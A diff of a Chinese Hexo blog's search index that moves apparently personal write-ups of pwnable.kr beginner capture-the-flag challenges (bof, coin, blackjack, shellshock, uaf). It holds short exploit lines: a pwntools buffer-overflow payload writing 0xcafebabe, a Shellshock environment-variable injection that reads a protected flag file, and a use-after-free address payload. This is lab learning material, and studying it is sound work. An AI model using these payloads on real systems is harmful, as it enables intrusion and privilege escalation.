@@ -89,6 +89,52 @@
       </tags>
   </entry>
   <entry>
+    <title>bof</title>
+    <url>/xiaohong404.github.io/2020/10/15/bof/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/4.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/1.png" class></strong></p>
+<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/2.png" class></strong></p>
+<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
+<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/3.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>coin</title>
+    <url>/xiaohong404.github.io/2020/10/18/coin/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/coin/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/coin/3.png" class></strong></p>
+<h3 id="使用netcat连接上远程的服务器"><a href="#使用netcat连接上远程的服务器" class="headerlink" title="使用netcat连接上远程的服务器"></a>使用netcat连接上远程的服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/coin/1.png" class></strong></p>
+<p>题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	N, C = re.findall(<span class="string">&quot;N=(\d+) C=(\d+)&quot;</span>, p.recv())[<span class="number">0</span>]</span><br><span class="line">	N = int(N)</span><br><span class="line">	C = int(C)</span><br><span class="line">	print(N, C)</span><br><span class="line"></span><br><span class="line">	start, end = <span class="number">0</span>, N<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> start &lt;= end <span class="keyword">and</span> C &gt; <span class="number">0</span>:</span><br><span class="line">		mid = (start + end) // <span class="number">2</span></span><br><span class="line">		x = <span class="string">&quot; &quot;</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> range(start, mid+<span class="number">1</span>)])	<span class="comment"># build range list</span></span><br><span class="line">		p.sendline(x)</span><br><span class="line">		</span><br><span class="line">		res = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">if</span> res % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">			start = mid+<span class="number">1</span>	<span class="comment"># through first half</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			end = mid<span class="number">-1</span>		<span class="comment"># through second half</span></span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> C &gt; <span class="number">0</span>:	<span class="comment"># use all the tries</span></span><br><span class="line">		p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">		p.recv(<span class="number">1024</span>)</span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	p.sendline(str(start))	<span class="comment"># final answer</span></span><br><span class="line">	print(p.recv())</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>
+
+<p>注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/coin/2.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>blackjack</title>
     <url>/xiaohong404.github.io/2020/10/19/blackjack/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/blackjack/0.png" class></strong></p>
@@ -102,28 +148,6 @@
 <p><strong><img src="/xiaohong404.github.io/2020/10/19/blackjack/3.png" class></strong></p>
 <p>如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。</p>
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/19/blackjack/4.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bof</title>
-    <url>/xiaohong404.github.io/2020/10/15/bof/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/4.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/1.png" class></strong></p>
-<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/2.png" class></strong></p>
-<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
-<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/3.png" class></strong></p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -194,30 +218,6 @@
 <p>注意这里参数需要转为10进制   $0x1234_{16} = 4660_{10}$</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>coin</title>
-    <url>/xiaohong404.github.io/2020/10/18/coin/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/coin/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/coin/3.png" class></strong></p>
-<h3 id="使用netcat连接上远程的服务器"><a href="#使用netcat连接上远程的服务器" class="headerlink" title="使用netcat连接上远程的服务器"></a>使用netcat连接上远程的服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/coin/1.png" class></strong></p>
-<p>题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	N, C = re.findall(<span class="string">&quot;N=(\d+) C=(\d+)&quot;</span>, p.recv())[<span class="number">0</span>]</span><br><span class="line">	N = int(N)</span><br><span class="line">	C = int(C)</span><br><span class="line">	print(N, C)</span><br><span class="line"></span><br><span class="line">	start, end = <span class="number">0</span>, N<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> start &lt;= end <span class="keyword">and</span> C &gt; <span class="number">0</span>:</span><br><span class="line">		mid = (start + end) // <span class="number">2</span></span><br><span class="line">		x = <span class="string">&quot; &quot;</span>.join([str(j) <span class="keyword">for</span> j <span class="keyword">in</span> range(start, mid+<span class="number">1</span>)])	<span class="comment"># build range list</span></span><br><span class="line">		p.sendline(x)</span><br><span class="line">		</span><br><span class="line">		res = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">		<span class="keyword">if</span> res % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">			start = mid+<span class="number">1</span>	<span class="comment"># through first half</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			end = mid<span class="number">-1</span>		<span class="comment"># through second half</span></span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> C &gt; <span class="number">0</span>:	<span class="comment"># use all the tries</span></span><br><span class="line">		p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">		p.recv(<span class="number">1024</span>)</span><br><span class="line">		C -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	p.sendline(str(start))	<span class="comment"># final answer</span></span><br><span class="line">	print(p.recv())</span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure>
-
-<p>注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/coin/2.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -343,43 +343,6 @@
       </tags>
   </entry>
   <entry>
-    <title>shellshock</title>
-    <url>/xiaohong404.github.io/2020/10/18/shellshock/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/0.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/1.png" class></strong></p>
-<h3 id="查看shellshock-c源文件"><a href="#查看shellshock-c源文件" class="headerlink" title="查看shellshock.c源文件"></a>查看shellshock.c源文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/2.png" class></strong></p>
-<p>程序依次运行三个函数*<a href="https://www.man7.org/linux/man-pages/man2/setresgid.2.html">setresuid、setresgid</a>、system*</p>
-<h3 id="查看程序的执行权限"><a href="#查看程序的执行权限" class="headerlink" title="查看程序的执行权限"></a>查看程序的执行权限</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/3.png" class></strong></p>
-<p>以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用的是effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。</p>
-<p><strong>这个组权限对于flag文件来说是可读的（r–）</strong>，但是问题在于这一段程序并没有涉及对flag的读操作，权限虽然有了，但怎么办呢？显然这里利用shellshock漏洞。可通过下面的命令证明确实存在shellshock漏洞：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; ./bash -c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/4.png" class></strong></p>
-<p>实际上，“x=’() { :;}; echo vulnerable”​是new出来了一个新的环境变量：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KEY=x</span><br><span class="line">VALUE=() &#123;:;&#125;; echo vulnerable</span><br></pre></td></tr></table></figure>
-
-<p>而当我们后续执行bash的时候，最终会定位到initialize_shell_variables中，这个函数内部会遍历所有的环境变量，而我们设计的VALUE绕过了其中一个export函数的定义检查，使得最终执行的是后面的echo vulnerable串。所以，调用bash的时候，自定义的这个语句就会触发。简而言之，这个漏洞会把用户输入的指令当作代码执行。</p>
-<p>于是，我们在这条语句的基础上将自定义语句换为bash -c “cat ./flag”，执行的程序bash -c换成./shellshock(它内部调用了bash -c ‘echo shock_me’)，因此当执行shellshock中的system函数会调用bash，总而自动执行cat flag这条命令，因为./shellshock执行时拿到了shellshock_pwn的权限，从而破壳漏洞可以在此权限上成功执行了cat ./flag，即成功实现了提权操作。</p>
-<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>运行下面语句拿到flag</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; bash -c &quot;cat ./flag&quot;&#x27; ./shellshock</span><br></pre></td></tr></table></figure>
-
-<p><strong></strong></p>
-<p>关于shellshock漏洞相关知识可参考：</p>
-<p>1、<a href="https://www.baidu.com/link?url=3yWq37n7Y_LHRUa2L-iudGGqqgT-6s4gKmaU0_hOQBDFSacVZ_bxZqpA999gplxb_gOwXfn9XSE9mE53bYkDBK&wd=&eqid=e40eff4200053949000000035aa32eda">关于<em>ShellShock</em>漏洞的利用过程和原理解析 - CSDN博客</a></p>
-<p>2、<a href="http://www.freebuf.com/articles/system/45390.html">破壳（ShellShock）漏洞样本分析报告</a></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>uaf</title>
     <url>/xiaohong404.github.io/2020/10/16/uaf/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/1.png" class></strong></p>
@@ -442,6 +405,43 @@
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;\x68\x15\x40\x00\x00\x00\x00\x00&#x27;&quot;</span> &gt; /tmp/<span class="built_in">exp</span>.txt</span><br></pre></td></tr></table></figure>
 
 <p><strong><img src="/xiaohong404.github.io/2020/10/16/uaf/12.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellshock</title>
+    <url>/xiaohong404.github.io/2020/10/18/shellshock/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/1.png" class></strong></p>
+<h3 id="查看shellshock-c源文件"><a href="#查看shellshock-c源文件" class="headerlink" title="查看shellshock.c源文件"></a>查看shellshock.c源文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/2.png" class></strong></p>
+<p>程序依次运行三个函数*<a href="https://www.man7.org/linux/man-pages/man2/setresgid.2.html">setresuid、setresgid</a>、system*</p>
+<h3 id="查看程序的执行权限"><a href="#查看程序的执行权限" class="headerlink" title="查看程序的执行权限"></a>查看程序的执行权限</h3><p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/3.png" class></strong></p>
+<p>以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用的是effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。</p>
+<p><strong>这个组权限对于flag文件来说是可读的（r–）</strong>，但是问题在于这一段程序并没有涉及对flag的读操作，权限虽然有了，但怎么办呢？显然这里利用shellshock漏洞。可通过下面的命令证明确实存在shellshock漏洞：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; ./bash -c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/18/shellshock/4.png" class></strong></p>
+<p>实际上，“x=’() { :;}; echo vulnerable”​是new出来了一个新的环境变量：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KEY=x</span><br><span class="line">VALUE=() &#123;:;&#125;; echo vulnerable</span><br></pre></td></tr></table></figure>
+
+<p>而当我们后续执行bash的时候，最终会定位到initialize_shell_variables中，这个函数内部会遍历所有的环境变量，而我们设计的VALUE绕过了其中一个export函数的定义检查，使得最终执行的是后面的echo vulnerable串。所以，调用bash的时候，自定义的这个语句就会触发。简而言之，这个漏洞会把用户输入的指令当作代码执行。</p>
+<p>于是，我们在这条语句的基础上将自定义语句换为bash -c “cat ./flag”，执行的程序bash -c换成./shellshock(它内部调用了bash -c ‘echo shock_me’)，因此当执行shellshock中的system函数会调用bash，总而自动执行cat flag这条命令，因为./shellshock执行时拿到了shellshock_pwn的权限，从而破壳漏洞可以在此权限上成功执行了cat ./flag，即成功实现了提权操作。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>运行下面语句拿到flag</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; bash -c &quot;cat ./flag&quot;&#x27; ./shellshock</span><br></pre></td></tr></table></figure>
+
+<p><strong></strong></p>
+<p>关于shellshock漏洞相关知识可参考：</p>
+<p>1、<a href="https://www.baidu.com/link?url=3yWq37n7Y_LHRUa2L-iudGGqqgT-6s4gKmaU0_hOQBDFSacVZ_bxZqpA999gplxb_gOwXfn9XSE9mE53bYkDBK&wd=&eqid=e40eff4200053949000000035aa32eda">关于<em>ShellShock</em>漏洞的利用过程和原理解析 - CSDN博客</a></p>
+<p>2、<a href="http://www.freebuf.com/articles/system/45390.html">破壳（ShellShock）漏洞样本分析报告</a></p>
 ]]></content>
       <categories>
         <category>PWN</category>
